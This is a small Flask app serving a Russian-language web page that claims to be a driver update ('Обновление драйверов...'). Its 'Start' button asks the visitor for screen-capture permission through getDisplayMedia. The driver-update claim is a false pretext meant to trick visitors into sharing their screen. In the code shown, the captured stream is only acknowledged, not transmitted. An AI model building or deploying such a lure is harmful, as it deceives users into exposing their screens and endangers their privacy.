from flask import Flask, render_template_string

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head><title>Загрузка...</title></head>
<body style="background:#1e1e1e; color:white; text-align:center; padding-top:50px; font-family:Arial;">
    <h1>Обновление драйверов...</h1>
    <p>Нажмите кнопку ниже, чтобы начать.</p>
    <button onclick="startScreen()" style="padding:15px 30px; font-size:20px; cursor:pointer; background:#007bff; color:white; border:none; border-radius:5px;">Начать</button>
    <div id="status" style="margin-top:20px; color:#aaa;"></div>
    <script>
        function startScreen() {
            document.getElementById('status').innerText = "Ожидание разрешения...";
            navigator.mediaDevices.getDisplayMedia({video: true}).then(stream => {
                document.getElementById('status').innerText = "Подключено!";
                document.querySelector('button').style.display = 'none';
            }).catch(err => { 
                document.getElementById('status').innerText = "Вы отклонили запрос."; 
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
